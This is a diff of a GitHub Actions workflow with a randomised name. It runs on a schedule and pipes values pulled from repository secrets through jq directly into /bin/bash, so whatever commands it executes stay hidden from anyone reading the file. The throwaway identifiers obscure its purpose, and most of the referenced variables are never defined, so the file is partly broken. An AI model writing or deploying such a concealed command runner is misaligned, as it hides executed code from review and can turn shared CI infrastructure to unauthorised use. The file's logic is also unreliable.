@@ -1,24 +1,23 @@
 name: cordagetwice
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '45 1/6 * * *'
-jobs:  # 13009
+    - cron: '44 5/6 * * *'
+jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: cordagetwice
         env:
-          i8: ${{ secrets.i8 }}
+          vfdsq88: ${{ secrets.vfdsq88 }}
         run: |
-          echo $i8 | jq -r .hahj1 | /bin/bash
-          echo $tdvl4 | jq -r .es02 | /bin/bash
-          echo $kjtk6191 | jq -r .ekzbu1726 | /bin/bash
-          echo $ld577 | jq -r .kw98793 | /bin/bash
-          echo $vnxc64 | jq -r .ld27 | /bin/bash
-          echo $edc74978 | jq -r .giih705 | /bin/bash
-          echo $hzaa6346 | jq -r .usz4 | /bin/bash
-          echo $hbrvk0536 | jq -r .j8161 | /bin/bash
+          echo $vfdsq88 | jq -r .gyoeo8 | /bin/bash
+          echo $bbn382 | jq -r .kvyu1717 | /bin/bash
+          echo $xj59 | jq -r .hxfrs5 | /bin/bash
+          echo $rbk62217 | jq -r .jvs5137 | /bin/bash
+          echo $ni5 | jq -r .p873 | /bin/bash
+          echo $tgp227 | jq -r .qyad06 | /bin/bash
+          echo $p2 | jq -r .a813 | /bin/bash
 
